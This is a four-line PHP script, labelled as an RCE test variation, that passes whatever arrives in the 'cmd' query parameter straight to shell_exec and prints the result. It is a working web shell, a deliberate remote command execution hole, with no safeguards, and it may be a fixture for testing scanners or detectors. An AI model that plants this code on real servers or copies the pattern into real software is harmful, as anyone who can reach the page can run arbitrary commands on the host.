<?php
// RCE test variation #1091
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>